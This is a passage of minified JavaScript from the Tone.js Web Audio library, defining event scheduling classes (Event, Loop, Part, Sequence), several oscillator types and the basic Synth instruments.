this._lfo.type},set:function(t){this._lfo.type=t}}),t.Vibrato.prototype.dispose=function(){t.Effect.prototype.dispose.call(this),this._delayNode.dispose(),this._delayNode=null,this._lfo.dispose(),this._lfo=null,this._writable(["frequency","depth"]),this.frequency=null,this.depth=null},t.Vibrato})),n((function(t){return t.Event=function(){var e=t.defaults(arguments,["callback","value"],t.Event);t.call(this),this._loop=e.loop,this.callback=e.callback,this.value=e.value,this._loopStart=this.toTicks(e.loopStart),this._loopEnd=this.toTicks(e.loopEnd),this._state=new t.TimelineState(t.State.Stopped),this._playbackRate=1,this._startOffset=0,this._probability=e.probability,this._humanize=e.humanize,this.mute=e.mute,this.playbackRate=e.playbackRate},t.extend(t.Event),t.Event.defaults={callback:t.noOp,loop:!1,loopEnd:"1m",loopStart:0,playbackRate:1,value:null,probability:1,mute:!1,humanize:!1},t.Event.prototype._rescheduleEvents=function(e){return e=t.defaultArg(e,-1),this._state.forEachFrom(e,function(e){var n;if(e.state===t.State.Started){t.isDefined(e.id)&&t.Transport.clear(e.id);var r=e.time+Math.round(this.startOffset/this._playbackRate);if(this._loop){n=1/0,t.isNumber(this._loop)&&(n=this._loop*this._getLoopDuration());var i=this._state.getAfter(r);null!==i&&(n=Math.min(n,i.time-r)),n!==1/0&&(this._state.setStateAtTime(t.State.Stopped,r+n+1),n=t.Ticks(n));var o=t.Ticks(this._getLoopDuration());e.id=t.Transport.scheduleRepeat(this._tick.bind(this),o,t.Ticks(r),n)}else e.id=t.Transport.schedule(this._tick.bind(this),t.Ticks(r))}}.bind(this)),this},Object.defineProperty(t.Event.prototype,"state",{get:function(){return this._state.getValueAtTime(t.Transport.ticks)}}),Object.defineProperty(t.Event.prototype,"startOffset",{get:function(){return this._startOffset},set:function(t){this._startOffset=t}}),Object.defineProperty(t.Event.prototype,"probability",{get:function(){return this._probability},set:function(t){this._probability=t}}),Object.defineProperty(t.Event.prototype,"humanize",{get:function(){return this._humanize},set:function(t){this._humanize=t}}),t.Event.prototype.start=function(e){return e=this.toTicks(e),this._state.getValueAtTime(e)===t.State.Stopped&&(this._state.add({state:t.State.Started,time:e,id:void 0}),this._rescheduleEvents(e)),this},t.Event.prototype.stop=function(e){if(this.cancel(e),e=this.toTicks(e),this._state.getValueAtTime(e)===t.State.Started){this._state.setStateAtTime(t.State.Stopped,e);var n=this._state.getBefore(e),r=e;null!==n&&(r=n.time),this._rescheduleEvents(r)}return this},t.Event.prototype.cancel=function(e){return e=t.defaultArg(e,-1/0),e=this.toTicks(e),this._state.forEachFrom(e,(function(e){t.Transport.clear(e.id)})),this._state.cancel(e),this},t.Event.prototype._tick=function(e){var n=t.Transport.getTicksAtTime(e);if(!this.mute&&this._state.getValueAtTime(n)===t.State.Started){if(this.probability<1&&Math.random()>this.probability)return;if(this.humanize){var r=.02;t.isBoolean(this.humanize)||(r=this.toSeconds(this.humanize)),e+=(2*Math.random()-1)*r}this.callback(e,this.value)}},t.Event.prototype._getLoopDuration=function(){return Math.round((this._loopEnd-this._loopStart)/this._playbackRate)},Object.defineProperty(t.Event.prototype,"loop",{get:function(){return this._loop},set:function(t){this._loop=t,this._rescheduleEvents()}}),Object.defineProperty(t.Event.prototype,"playbackRate",{get:function(){return this._playbackRate},set:function(t){this._playbackRate=t,this._rescheduleEvents()}}),Object.defineProperty(t.Event.prototype,"loopEnd",{get:function(){return t.Ticks(this._loopEnd).toSeconds()},set:function(t){this._loopEnd=this.toTicks(t),this._loop&&this._rescheduleEvents()}}),Object.defineProperty(t.Event.prototype,"loopStart",{get:function(){return t.Ticks(this._loopStart).toSeconds()},set:function(t){this._loopStart=this.toTicks(t),this._loop&&this._rescheduleEvents()}}),Object.defineProperty(t.Event.prototype,"progress",{get:function(){if(this._loop){var e=t.Transport.ticks,n=this._state.get(e);if(null!==n&&n.state===t.State.Started){var r=this._getLoopDuration();return(e-n.time)%r/r}return 0}return 0}}),t.Event.prototype.dispose=function(){this.cancel(),this._state.dispose(),this._state=null,this.callback=null,this.value=null},t.Event})),n((function(t){return t.Loop=function(){var e=t.defaults(arguments,["callback","interval"],t.Loop);t.call(this),this._event=new t.Event({callback:this._tick.bind(this),loop:!0,loopEnd:e.interval,playbackRate:e.playbackRate,probability:e.probability}),this.callback=e.callback,this.iterations=e.iterations},t.extend(t.Loop),t.Loop.defaults={interval:"4n",callback:t.noOp,playbackRate:1,iterations:1/0,probability:!0,mute:!1},t.Loop.prototype.start=function(t){return this._event.start(t),this},t.Loop.prototype.stop=function(t){return this._event.stop(t),this},t.Loop.prototype.cancel=function(t){return this._event.cancel(t),this},t.Loop.prototype._tick=function(t){this.callback(t)},Object.defineProperty(t.Loop.prototype,"state",{get:function(){return this._event.state}}),Object.defineProperty(t.Loop.prototype,"progress",{get:function(){return this._event.progress}}),Object.defineProperty(t.Loop.prototype,"interval",{get:function(){return this._event.loopEnd},set:function(t){this._event.loopEnd=t}}),Object.defineProperty(t.Loop.prototype,"playbackRate",{get:function(){return this._event.playbackRate},set:function(t){this._event.playbackRate=t}}),Object.defineProperty(t.Loop.prototype,"humanize",{get:function(){return this._event.humanize},set:function(t){this._event.humanize=t}}),Object.defineProperty(t.Loop.prototype,"probability",{get:function(){return this._event.probability},set:function(t){this._event.probability=t}}),Object.defineProperty(t.Loop.prototype,"mute",{get:function(){return this._event.mute},set:function(t){this._event.mute=t}}),Object.defineProperty(t.Loop.prototype,"iterations",{get:function(){return!0===this._event.loop?1/0:this._event.loop},set:function(t){this._event.loop=t===1/0||t}}),t.Loop.prototype.dispose=function(){this._event.dispose(),this._event=null,this.callback=null},t.Loop})),n((function(t){return t.Part=function(){var e=t.defaults(arguments,["callback","events"],t.Part);t.Event.call(this,e),this._events=[];for(var n=0;n<e.events.length;n++)Array.isArray(e.events[n])?this.add(e.events[n][0],e.events[n][1]):this.add(e.events[n])},t.extend(t.Part,t.Event),t.Part.defaults={callback:t.noOp,loop:!1,loopEnd:"1m",loopStart:0,playbackRate:1,probability:1,humanize:!1,mute:!1,events:[]},t.Part.prototype.start=function(e,n){var r=this.toTicks(e);return this._state.getValueAtTime(r)!==t.State.Started&&(n=this._loop?t.defaultArg(n,this._loopStart):t.defaultArg(n,0),n=this.toTicks(n),this._state.add({state:t.State.Started,time:r,offset:n}),this._forEach((function(t){this._startNote(t,r,n)}))),this},t.Part.prototype._startNote=function(e,n,r){n-=r,this._loop?e.startOffset>=this._loopStart&&e.startOffset<this._loopEnd?(e.startOffset<r&&(n+=this._getLoopDuration()),e.start(t.Ticks(n))):e.startOffset<this._loopStart&&e.startOffset>=r&&(e.loop=!1,e.start(t.Ticks(n))):e.startOffset>=r&&e.start(t.Ticks(n))},Object.defineProperty(t.Part.prototype,"startOffset",{get:function(){return this._startOffset},set:function(t){this._startOffset=t,this._forEach((function(t){t.startOffset+=this._startOffset}))}}),t.Part.prototype.stop=function(e){var n=this.toTicks(e);return this._state.cancel(n),this._state.setStateAtTime(t.State.Stopped,n),this._forEach((function(t){t.stop(e)})),this},t.Part.prototype.at=function(e,n){e=t.TransportTime(e);for(var r=t.Ticks(1).toSeconds(),i=0;i<this._events.length;i++){var o=this._events[i];if(Math.abs(e.toTicks()-o.startOffset)<r)return t.isDefined(n)&&(o.value=n),o}return t.isDefined(n)?(this.add(e,n),this._events[this._events.length-1]):null},t.Part.prototype.add=function(e,n){var r;return e.hasOwnProperty("time")&&(e=(n=e).time),e=this.toTicks(e),n instanceof t.Event?(r=n).callback=this._tick.bind(this):r=new t.Event({callback:this._tick.bind(this),value:n}),r.startOffset=e,r.set({loopEnd:this.loopEnd,loopStart:this.loopStart,loop:this.loop,humanize:this.humanize,playbackRate:this.playbackRate,probability:this.probability}),this._events.push(r),this._restartEvent(r),this},t.Part.prototype._restartEvent=function(e){this._state.forEach(function(n){n.state===t.State.Started?this._startNote(e,n.time,n.offset):e.stop(t.Ticks(n.time))}.bind(this))},t.Part.prototype.remove=function(e,n){e.hasOwnProperty("time")&&(e=(n=e).time),e=this.toTicks(e);for(var r=this._events.length-1;r>=0;r--){var i=this._events[r];i instanceof t.Part?i.remove(e,n):i.startOffset===e&&(t.isUndef(n)||t.isDefined(n)&&i.value===n)&&(this._events.splice(r,1),i.dispose())}return this},t.Part.prototype.removeAll=function(){return this._forEach((function(t){t.dispose()})),this._events=[],this},t.Part.prototype.cancel=function(t){return this._forEach((function(e){e.cancel(t)})),this._state.cancel(this.toTicks(t)),this},t.Part.prototype._forEach=function(e,n){if(this._events){n=t.defaultArg(n,this);for(var r=this._events.length-1;r>=0;r--){var i=this._events[r];i instanceof t.Part?i._forEach(e,n):e.call(n,i)}}return this},t.Part.prototype._setAll=function(t,e){this._forEach((function(n){n[t]=e}))},t.Part.prototype._tick=function(t,e){this.mute||this.callback(t,e)},t.Part.prototype._testLoopBoundries=function(e){e.startOffset<this._loopStart||e.startOffset>=this._loopEnd?e.cancel(0):e.state===t.State.Stopped&&this._restartEvent(e)},Object.defineProperty(t.Part.prototype,"probability",{get:function(){return this._probability},set:function(t){this._probability=t,this._setAll("probability",t)}}),Object.defineProperty(t.Part.prototype,"humanize",{get:function(){return this._humanize},set:function(t){this._humanize=t,this._setAll("humanize",t)}}),Object.defineProperty(t.Part.prototype,"loop",{get:function(){return this._loop},set:function(t){this._loop=t,this._forEach((function(e){e._loopStart=this._loopStart,e._loopEnd=this._loopEnd,e.loop=t,this._testLoopBoundries(e)}))}}),Object.defineProperty(t.Part.prototype,"loopEnd",{get:function(){return t.Ticks(this._loopEnd).toSeconds()},set:function(t){this._loopEnd=this.toTicks(t),this._loop&&this._forEach((function(e){e.loopEnd=t,this._testLoopBoundries(e)}))}}),Object.defineProperty(t.Part.prototype,"loopStart",{get:function(){return t.Ticks(this._loopStart).toSeconds()},set:function(t){this._loopStart=this.toTicks(t),this._loop&&this._forEach((function(t){t.loopStart=this.loopStart,this._testLoopBoundries(t)}))}}),Object.defineProperty(t.Part.prototype,"playbackRate",{get:function(){return this._playbackRate},set:function(t){this._playbackRate=t,this._setAll("playbackRate",t)}}),Object.defineProperty(t.Part.prototype,"length",{get:function(){return this._events.length}}),t.Part.prototype.dispose=function(){return this.removeAll(),this._state.dispose(),this._state=null,this.callback=null,this._events=null,this},t.Part})),n((function(t){return t.Pattern=function(){var e=t.defaults(arguments,["callback","values","pattern"],t.Pattern);t.Loop.call(this,e),this._pattern=new t.CtrlPattern({values:e.values,type:e.pattern,index:e.index})},t.extend(t.Pattern,t.Loop),t.Pattern.defaults={pattern:t.CtrlPattern.Type.Up,callback:t.noOp,values:[]},t.Pattern.prototype._tick=function(t){this.callback(t,this._pattern.value),this._pattern.next()},Object.defineProperty(t.Pattern.prototype,"index",{get:function(){return this._pattern.index},set:function(t){this._pattern.index=t}}),Object.defineProperty(t.Pattern.prototype,"values",{get:function(){return this._pattern.values},set:function(t){this._pattern.values=t}}),Object.defineProperty(t.Pattern.prototype,"value",{get:function(){return this._pattern.value}}),Object.defineProperty(t.Pattern.prototype,"pattern",{get:function(){return this._pattern.type},set:function(t){this._pattern.type=t}}),t.Pattern.prototype.dispose=function(){t.Loop.prototype.dispose.call(this),this._pattern.dispose(),this._pattern=null},t.Pattern})),n((function(t){return t.Sequence=function(){var e=t.defaults(arguments,["callback","events","subdivision"],t.Sequence),n=e.events;if(delete e.events,t.Part.call(this,e),this._subdivision=this.toTicks(e.subdivision),t.isUndef(e.loopEnd)&&t.isDefined(n)&&(this._loopEnd=n.length*this._subdivision),this._loop=!0,t.isDefined(n))for(var r=0;r<n.length;r++)this.add(r,n[r])},t.extend(t.Sequence,t.Part),t.Sequence.defaults={subdivision:"4n"},Object.defineProperty(t.Sequence.prototype,"subdivision",{get:function(){return t.Ticks(this._subdivision).toSeconds()}}),t.Sequence.prototype.at=function(e,n){return t.isArray(n)&&this.remove(e),t.Part.prototype.at.call(this,this._indexTime(e),n)},t.Sequence.prototype.add=function(e,n){if(null===n)return this;if(t.isArray(n)){var r=Math.round(this._subdivision/n.length);n=new t.Sequence(this._tick.bind(this),n,t.Ticks(r))}return t.Part.prototype.add.call(this,this._indexTime(e),n),this},t.Sequence.prototype.remove=function(e,n){return t.Part.prototype.remove.call(this,this._indexTime(e),n),this},t.Sequence.prototype._indexTime=function(e){return e instanceof t.TransportTime?e:t.Ticks(e*this._subdivision+this.startOffset).toSeconds()},t.Sequence.prototype.dispose=function(){return t.Part.prototype.dispose.call(this),this},t.Sequence})),n((function(t){return t.PulseOscillator=function(){var e=t.defaults(arguments,["frequency","width"],t.Oscillator);t.Source.call(this,e),this.width=new t.Signal(e.width,t.Type.NormalRange),this._widthGate=new t.Gain,this._sawtooth=new t.Oscillator({frequency:e.frequency,detune:e.detune,type:"sawtooth",phase:e.phase}),this.frequency=this._sawtooth.frequency,this.detune=this._sawtooth.detune,this._thresh=new t.WaveShaper((function(t){return t<0?-1:1})),this._sawtooth.chain(this._thresh,this.output),this.width.chain(this._widthGate,this._thresh),this._readOnly(["width","frequency","detune"])},t.extend(t.PulseOscillator,t.Source),t.PulseOscillator.defaults={frequency:440,detune:0,phase:0,width:.2},t.PulseOscillator.prototype._start=function(t){t=this.toSeconds(t),this._sawtooth.start(t),this._widthGate.gain.setValueAtTime(1,t)},t.PulseOscillator.prototype._stop=function(t){t=this.toSeconds(t),this._sawtooth.stop(t),this._widthGate.gain.setValueAtTime(0,t)},t.PulseOscillator.prototype.restart=function(t){this._sawtooth.restart(t)},Object.defineProperty(t.PulseOscillator.prototype,"phase",{get:function(){return this._sawtooth.phase},set:function(t){this._sawtooth.phase=t}}),Object.defineProperty(t.PulseOscillator.prototype,"type",{get:function(){return"pulse"}}),Object.defineProperty(t.PulseOscillator.prototype,"partials",{get:function(){return[]}}),t.PulseOscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this._sawtooth.dispose(),this._sawtooth=null,this._writable(["width","frequency","detune"]),this.width.dispose(),this.width=null,this._widthGate.dispose(),this._widthGate=null,this._thresh.dispose(),this._thresh=null,this.frequency=null,this.detune=null,this},t.PulseOscillator})),n((function(t){return t.PWMOscillator=function(){var e=t.defaults(arguments,["frequency","modulationFrequency"],t.PWMOscillator);t.Source.call(this,e),this._pulse=new t.PulseOscillator(e.modulationFrequency),this._pulse._sawtooth.type="sine",this._modulator=new t.Oscillator({frequency:e.frequency,detune:e.detune,phase:e.phase}),this._scale=new t.Multiply(2),this.frequency=this._modulator.frequency,this.detune=this._modulator.detune,this.modulationFrequency=this._pulse.frequency,this._modulator.chain(this._scale,this._pulse.width),this._pulse.connect(this.output),this._readOnly(["modulationFrequency","frequency","detune"])},t.extend(t.PWMOscillator,t.Source),t.PWMOscillator.defaults={frequency:440,detune:0,phase:0,modulationFrequency:.4},t.PWMOscillator.prototype._start=function(t){t=this.toSeconds(t),this._modulator.start(t),this._pulse.start(t)},t.PWMOscillator.prototype._stop=function(t){t=this.toSeconds(t),this._modulator.stop(t),this._pulse.stop(t)},t.PWMOscillator.prototype.restart=function(t){this._modulator.restart(t),this._pulse.restart(t)},Object.defineProperty(t.PWMOscillator.prototype,"type",{get:function(){return"pwm"}}),Object.defineProperty(t.PWMOscillator.prototype,"partials",{get:function(){return[]}}),Object.defineProperty(t.PWMOscillator.prototype,"phase",{get:function(){return this._modulator.phase},set:function(t){this._modulator.phase=t}}),t.PWMOscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this._pulse.dispose(),this._pulse=null,this._scale.dispose(),this._scale=null,this._modulator.dispose(),this._modulator=null,this._writable(["modulationFrequency","frequency","detune"]),this.frequency=null,this.detune=null,this.modulationFrequency=null,this},t.PWMOscillator})),n((function(t){return t.FMOscillator=function(){var e=t.defaults(arguments,["frequency","type","modulationType"],t.FMOscillator);t.Source.call(this,e),this._carrier=new t.Oscillator(e.frequency,e.type),this.frequency=new t.Signal(e.frequency,t.Type.Frequency),this.detune=this._carrier.detune,this.detune.value=e.detune,this.modulationIndex=new t.Multiply(e.modulationIndex),this.modulationIndex.units=t.Type.Positive,this._modulator=new t.Oscillator(e.frequency,e.modulationType),this.harmonicity=new t.Multiply(e.harmonicity),this.harmonicity.units=t.Type.Positive,this._modulationNode=new t.Gain(0),this.frequency.connect(this._carrier.frequency),this.frequency.chain(this.harmonicity,this._modulator.frequency),this.frequency.chain(this.modulationIndex,this._modulationNode),this._modulator.connect(this._modulationNode.gain),this._modulationNode.connect(this._carrier.frequency),this._carrier.connect(this.output),this.detune.connect(this._modulator.detune),this.phase=e.phase,this._readOnly(["modulationIndex","frequency","detune","harmonicity"])},t.extend(t.FMOscillator,t.Source),t.FMOscillator.defaults={frequency:440,detune:0,phase:0,modulationIndex:2,modulationType:"square",harmonicity:1},t.FMOscillator.prototype._start=function(t){this._modulator.start(t),this._carrier.start(t)},t.FMOscillator.prototype._stop=function(t){this._modulator.stop(t),this._carrier.stop(t)},t.FMOscillator.prototype.restart=function(t){this._modulator.restart(t),this._carrier.restart(t)},Object.defineProperty(t.FMOscillator.prototype,"type",{get:function(){return this._carrier.type},set:function(t){this._carrier.type=t}}),Object.defineProperty(t.FMOscillator.prototype,"modulationType",{get:function(){return this._modulator.type},set:function(t){this._modulator.type=t}}),Object.defineProperty(t.FMOscillator.prototype,"phase",{get:function(){return this._carrier.phase},set:function(t){this._carrier.phase=t,this._modulator.phase=t}}),Object.defineProperty(t.FMOscillator.prototype,"partials",{get:function(){return this._carrier.partials},set:function(t){this._carrier.partials=t}}),t.FMOscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this._writable(["modulationIndex","frequency","detune","harmonicity"]),this.frequency.dispose(),this.frequency=null,this.detune=null,this.harmonicity.dispose(),this.harmonicity=null,this._carrier.dispose(),this._carrier=null,this._modulator.dispose(),this._modulator=null,this._modulationNode.dispose(),this._modulationNode=null,this.modulationIndex.dispose(),this.modulationIndex=null,this},t.FMOscillator})),n((function(t){return t.AMOscillator=function(){var e=t.defaults(arguments,["frequency","type","modulationType"],t.AMOscillator);t.Source.call(this,e),this._carrier=new t.Oscillator(e.frequency,e.type),this.frequency=this._carrier.frequency,this.detune=this._carrier.detune,this.detune.value=e.detune,this._modulator=new t.Oscillator(e.frequency,e.modulationType),this._modulationScale=new t.AudioToGain,this.harmonicity=new t.Multiply(e.harmonicity),this.harmonicity.units=t.Type.Positive,this._modulationNode=new t.Gain(0),this.frequency.chain(this.harmonicity,this._modulator.frequency),this.detune.connect(this._modulator.detune),this._modulator.chain(this._modulationScale,this._modulationNode.gain),this._carrier.chain(this._modulationNode,this.output),this.phase=e.phase,this._readOnly(["frequency","detune","harmonicity"])},t.extend(t.AMOscillator,t.Oscillator),t.AMOscillator.defaults={frequency:440,detune:0,phase:0,modulationType:"square",harmonicity:1},t.AMOscillator.prototype._start=function(t){this._modulator.start(t),this._carrier.start(t)},t.AMOscillator.prototype._stop=function(t){this._modulator.stop(t),this._carrier.stop(t)},t.AMOscillator.prototype.restart=function(t){this._modulator.restart(t),this._carrier.restart(t)},Object.defineProperty(t.AMOscillator.prototype,"type",{get:function(){return this._carrier.type},set:function(t){this._carrier.type=t}}),Object.defineProperty(t.AMOscillator.prototype,"modulationType",{get:function(){return this._modulator.type},set:function(t){this._modulator.type=t}}),Object.defineProperty(t.AMOscillator.prototype,"phase",{get:function(){return this._carrier.phase},set:function(t){this._carrier.phase=t,this._modulator.phase=t}}),Object.defineProperty(t.AMOscillator.prototype,"partials",{get:function(){return this._carrier.partials},set:function(t){this._carrier.partials=t}}),t.AMOscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this._writable(["frequency","detune","harmonicity"]),this.frequency=null,this.detune=null,this.harmonicity.dispose(),this.harmonicity=null,this._carrier.dispose(),this._carrier=null,this._modulator.dispose(),this._modulator=null,this._modulationNode.dispose(),this._modulationNode=null,this._modulationScale.dispose(),this._modulationScale=null,this},t.AMOscillator})),n((function(t){return t.FatOscillator=function(){var e=t.defaults(arguments,["frequency","type","spread"],t.FatOscillator);t.Source.call(this,e),this.frequency=new t.Signal(e.frequency,t.Type.Frequency),this.detune=new t.Signal(e.detune,t.Type.Cents),this._oscillators=[],this._spread=e.spread,this._type=e.type,this._phase=e.phase,this._partials=t.defaultArg(e.partials,[]),this.count=e.count,this._readOnly(["frequency","detune"])},t.extend(t.FatOscillator,t.Source),t.FatOscillator.defaults={frequency:440,detune:0,phase:0,spread:20,count:3,type:"sawtooth"},t.FatOscillator.prototype._start=function(t){t=this.toSeconds(t),this._forEach((function(e){e.start(t)}))},t.FatOscillator.prototype._stop=function(t){t=this.toSeconds(t),this._forEach((function(e){e.stop(t)}))},t.FatOscillator.prototype.restart=function(t){t=this.toSeconds(t),this._forEach((function(e){e.restart(t)}))},t.FatOscillator.prototype._forEach=function(t){for(var e=0;e<this._oscillators.length;e++)t.call(this,this._oscillators[e],e)},Object.defineProperty(t.FatOscillator.prototype,"type",{get:function(){return this._type},set:function(t){this._type=t,this._forEach((function(e){e.type=t}))}}),Object.defineProperty(t.FatOscillator.prototype,"spread",{get:function(){return this._spread},set:function(t){if(this._spread=t,this._oscillators.length>1){var e=-t/2,n=t/(this._oscillators.length-1);this._forEach((function(t,r){t.detune.value=e+n*r}))}}}),Object.defineProperty(t.FatOscillator.prototype,"count",{get:function(){return this._oscillators.length},set:function(e){if(e=Math.max(e,1),this._oscillators.length!==e){this._forEach((function(t){t.dispose()})),this._oscillators=[];for(var n=0;n<e;n++){var r=new t.Oscillator;this.type===t.Oscillator.Type.Custom?r.partials=this._partials:r.type=this._type,r.phase=this._phase,r.volume.value=-6-1.1*e,this.frequency.connect(r.frequency),this.detune.connect(r.detune),r.connect(this.output),this._oscillators[n]=r}this.spread=this._spread,this.state===t.State.Started&&this._forEach((function(t){t.start()}))}}}),Object.defineProperty(t.FatOscillator.prototype,"phase",{get:function(){return this._phase},set:function(t){this._phase=t,this._forEach((function(e){e.phase=t}))}}),Object.defineProperty(t.FatOscillator.prototype,"partials",{get:function(){return this._partials},set:function(e){this._partials=e,this._type=t.Oscillator.Type.Custom,this._forEach((function(t){t.partials=e}))}}),t.FatOscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this._writable(["frequency","detune"]),this.frequency.dispose(),this.frequency=null,this.detune.dispose(),this.detune=null,this._forEach((function(t){t.dispose()})),this._oscillators=null,this._partials=null,this},t.FatOscillator})),n((function(t){t.OmniOscillator=function(){var e=t.defaults(arguments,["frequency","type"],t.OmniOscillator);t.Source.call(this,e),this.frequency=new t.Signal(e.frequency,t.Type.Frequency),this.detune=new t.Signal(e.detune,t.Type.Cents),this._sourceType=void 0,this._oscillator=null,this.type=e.type,this._readOnly(["frequency","detune"]),this.set(e)},t.extend(t.OmniOscillator,t.Source),t.OmniOscillator.defaults={frequency:440,detune:0,type:"sine",phase:0};var e="PulseOscillator",n="PWMOscillator",r="Oscillator",i="FMOscillator",o="AMOscillator",s="FatOscillator";return t.OmniOscillator.prototype._start=function(t){this._oscillator.start(t)},t.OmniOscillator.prototype._stop=function(t){this._oscillator.stop(t)},t.OmniOscillator.prototype.restart=function(t){this._oscillator.restart(t)},Object.defineProperty(t.OmniOscillator.prototype,"type",{get:function(){var t="";return this._sourceType===i?t="fm":this._sourceType===o?t="am":this._sourceType===s&&(t="fat"),t+this._oscillator.type},set:function(t){"fm"===t.substr(0,2)?(this._createNewOscillator(i),this._oscillator.type=t.substr(2)):"am"===t.substr(0,2)?(this._createNewOscillator(o),this._oscillator.type=t.substr(2)):"fat"===t.substr(0,3)?(this._createNewOscillator(s),this._oscillator.type=t.substr(3)):"pwm"===t?this._createNewOscillator(n):"pulse"===t?this._createNewOscillator(e):(this._createNewOscillator(r),this._oscillator.type=t)}}),Object.defineProperty(t.OmniOscillator.prototype,"partials",{get:function(){return this._oscillator.partials},set:function(t){this._oscillator.partials=t}}),t.OmniOscillator.prototype.set=function(e,n){return"type"===e?this.type=n:t.isObject(e)&&e.hasOwnProperty("type")&&(this.type=e.type),t.prototype.set.apply(this,arguments),this},t.OmniOscillator.prototype._createNewOscillator=function(e){if(e!==this._sourceType){this._sourceType=e;var n=t[e],r=this.now();if(null!==this._oscillator){var i=this._oscillator;i.stop(r),this.context.setTimeout((function(){i.dispose(),i=null}),this.blockTime)}this._oscillator=new n,this.frequency.connect(this._oscillator.frequency),this.detune.connect(this._oscillator.detune),this._oscillator.connect(this.output),this.state===t.State.Started&&this._oscillator.start(r)}},Object.defineProperty(t.OmniOscillator.prototype,"phase",{get:function(){return this._oscillator.phase},set:function(t){this._oscillator.phase=t}}),Object.defineProperty(t.OmniOscillator.prototype,"width",{get:function(){if(this._sourceType===e)return this._oscillator.width}}),Object.defineProperty(t.OmniOscillator.prototype,"count",{get:function(){if(this._sourceType===s)return this._oscillator.count},set:function(t){this._sourceType===s&&(this._oscillator.count=t)}}),Object.defineProperty(t.OmniOscillator.prototype,"spread",{get:function(){if(this._sourceType===s)return this._oscillator.spread},set:function(t){this._sourceType===s&&(this._oscillator.spread=t)}}),Object.defineProperty(t.OmniOscillator.prototype,"modulationType",{get:function(){if(this._sourceType===i||this._sourceType===o)return this._oscillator.modulationType},set:function(t){this._sourceType!==i&&this._sourceType!==o||(this._oscillator.modulationType=t)}}),Object.defineProperty(t.OmniOscillator.prototype,"modulationIndex",{get:function(){if(this._sourceType===i)return this._oscillator.modulationIndex}}),Object.defineProperty(t.OmniOscillator.prototype,"harmonicity",{get:function(){if(this._sourceType===i||this._sourceType===o)return this._oscillator.harmonicity}}),Object.defineProperty(t.OmniOscillator.prototype,"modulationFrequency",{get:function(){if(this._sourceType===n)return this._oscillator.modulationFrequency}}),t.OmniOscillator.prototype.dispose=function(){return t.Source.prototype.dispose.call(this),this._writable(["frequency","detune"]),this.detune.dispose(),this.detune=null,this.frequency.dispose(),this.frequency=null,this._oscillator.dispose(),this._oscillator=null,this._sourceType=null,this},t.OmniOscillator})),n((function(t){return t.Instrument=function(e){e=t.defaultArg(e,t.Instrument.defaults),t.AudioNode.call(this),this._volume=this.output=new t.Volume(e.volume),this.volume=this._volume.volume,this._readOnly("volume"),this._scheduledEvents=[]},t.extend(t.Instrument,t.AudioNode),t.Instrument.defaults={volume:0},t.Instrument.prototype.triggerAttack=t.noOp,t.Instrument.prototype.triggerRelease=t.noOp,t.Instrument.prototype.sync=function(){return this._syncMethod("triggerAttack",1),this._syncMethod("triggerRelease",0),this},t.Instrument.prototype._syncMethod=function(e,n){var r=this["_original_"+e]=this[e];this[e]=function(){var e=Array.prototype.slice.call(arguments),i=e[n],o=t.Transport.schedule(function(t){e[n]=t,r.apply(this,e)}.bind(this),i);this._scheduledEvents.push(o)}.bind(this)},t.Instrument.prototype.unsync=function(){return this._scheduledEvents.forEach((function(e){t.Transport.clear(e)})),this._scheduledEvents=[],this._original_triggerAttack&&(this.triggerAttack=this._original_triggerAttack,this.triggerRelease=this._original_triggerRelease),this},t.Instrument.prototype.triggerAttackRelease=function(t,e,n,r){return n=this.toSeconds(n),e=this.toSeconds(e),this.triggerAttack(t,n,r),this.triggerRelease(n+e),this},t.Instrument.prototype.dispose=function(){return t.AudioNode.prototype.dispose.call(this),this._volume.dispose(),this._volume=null,this._writable(["volume"]),this.volume=null,this.unsync(),this._scheduledEvents=null,this},t.Instrument})),n((function(t){return t.Monophonic=function(e){e=t.defaultArg(e,t.Monophonic.defaults),t.Instrument.call(this,e),this.portamento=e.portamento},t.extend(t.Monophonic,t.Instrument),t.Monophonic.defaults={portamento:0},t.Monophonic.prototype.triggerAttack=function(t,e,n){return e=this.toSeconds(e),this._triggerEnvelopeAttack(e,n),this.setNote(t,e),this},t.Monophonic.prototype.triggerRelease=function(t){return t=this.toSeconds(t),this._triggerEnvelopeRelease(t),this},t.Monophonic.prototype._triggerEnvelopeAttack=function(){},t.Monophonic.prototype._triggerEnvelopeRelease=function(){},t.Monophonic.prototype.getLevelAtTime=function(t){return t=this.toSeconds(t),this.envelope.getValueAtTime(t)},t.Monophonic.prototype.setNote=function(t,e){if(e=this.toSeconds(e),this.portamento>0&&this.getLevelAtTime(e)>.05){var n=this.toSeconds(this.portamento);this.frequency.exponentialRampTo(t,n,e)}else this.frequency.setValueAtTime(t,e);return this},t.Monophonic})),n((function(t){return t.Synth=function(e){e=t.defaultArg(e,t.Synth.defaults),t.Monophonic.call(this,e),this.oscillator=new t.OmniOscillator(e.oscillator),this.frequency=this.oscillator.frequency,this.detune=this.oscillator.detune,this.envelope=new t.AmplitudeEnvelope(e.envelope),this.oscillator.chain(this.envelope,this.output),this._readOnly(["oscillator","frequency","detune","envelope"])},t.extend(t.Synth,t.Monophonic),t.Synth.defaults={oscillator:{type:"triangle"},envelope:{attack:.005,decay:.1,sustain:.3,release:1}},t.Synth.prototype._triggerEnvelopeAttack=function(t,e){return this.envelope.triggerAttack(t,e),this.oscillator.start(t),0===this.envelope.sustain&&this.oscillator.stop(t+this.envelope.attack+this.envelope.decay),this},t.Synth.prototype._triggerEnvelopeRelease=function(t){return t=this.toSeconds(t),this.envelope.triggerRelease(t),this.oscillator.stop(t+this.envelope.release),this},t.Synth.prototype.dispose=function(){return t.Monophonic.prototype.dispose.call(this),this._writable(["oscillator","frequency","detune","envelope"]),this.oscillator.dispose(),this.oscillator=null,this.envelope.dispose(),this.envelope=null,this.frequency=null,this.detune=null,this},t.Synth})),n((function(t){return t.AMSynth=function(e){e=t.defaultArg(e,t.AMSynth.defaults),t.Monophonic.call(this,e),this._carrier=new t.Synth,this._carrier.volume.value=-10,this.oscillator=this._carrier.oscillator,this.envelope=this._carrier.envelope.set(e.envelope),this._modulator=new t.Synth,this._modulator.volume.value=-10,this.modulation=this._modulator.oscillator.set(e.modulation),this.modulationEnvelope=this._modulator.envelope.set(e.modulationEnvelope),this.frequency=new t.Signal(440,t.Type.Frequency),this.detune=new 